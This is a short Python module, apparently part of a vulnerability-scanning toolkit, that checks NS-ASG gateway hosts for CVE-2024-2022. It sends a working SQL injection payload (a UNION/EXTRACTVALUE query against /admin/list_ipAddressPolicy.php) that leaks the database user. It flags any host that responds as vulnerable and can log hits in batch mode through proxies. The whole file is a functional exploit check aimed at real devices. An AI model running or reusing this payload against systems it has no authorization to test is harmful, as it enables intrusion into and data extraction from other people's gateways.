#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import requests,urllib3
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc,OutPrintInfoErr
from pub.com.reqset import ReqSet
from pub.com.output import OutPutFile
urllib3.disable_warnings()
class Cve_2024_2022:
    def get_url(self,input_url):
        try:
            url = input_url + "/admin/list_ipAddressPolicy.php?GroupId=-1+UNION+ALL+SELECT+EXTRACTVALUE(1,concat(0x7e,(select+user()),0x7e))"
            req = requests.get(url,headers=self.headers,proxies=self.proxy,verify=self.ssl)
            if "@localhost~" in req.text:
                OutPrintInfoSuc("NS-ASG", f'目标存在CVE-2024-2022-SQL漏洞: {url}')
                if self.batch:
                    OutPutFile("wangguan_ns_asg_2024_2022.txt",f'目标存在CVE-2024-2022-SQL漏洞: {url}')

                return True
            else:
                if not self.batch:
                    OutPrintInfo("NS-ASG", f'目标不存在CVE-2024-2022-SQL漏洞')
                return False
        except Exception as e:
            if not self.batch:
                OutPrintInfo("NS-ASG",'目标请求出错')
            return False


    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        header = target["header"]
        self.ssl = target["ssl"]
        proxy = target["proxy"]
        self.headers, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("NS-ASG", '开始检测CVE-2024-2022-SQL漏洞...')
        self.get_url(url)
        if not self.batch:
            OutPrintInfo("NS-ASG", 'CVE-2024-2022-SQL漏洞检测结束')



